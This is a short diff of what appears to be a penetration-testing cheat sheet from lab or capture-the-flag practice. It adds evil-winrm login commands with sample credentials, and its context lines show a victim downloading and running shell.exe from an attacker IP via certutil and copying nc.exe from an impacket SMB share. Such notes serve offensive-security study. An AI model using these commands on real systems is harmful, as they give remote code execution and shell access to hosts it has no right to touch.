@@ -227,7 +227,10 @@ Password Protected SSH Private Key:
 			- On victim
 				- download shell: certutil -f -split -urlcache http://10.10.16.23/shell.exe C:\temp\shell.exe
 				- execute it: C:\temp\shell.exe
-			
+	- winrm
+		- if you see a winrm service and you have credentials
+			- sudo gem install evil-winrm 
+			- evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161 
 	- impacket
 		- Start SMB server: impacket-smbserver smb Downloads/ 
 		- On victim: copy \\10.10.16.12\smb\nc.exe
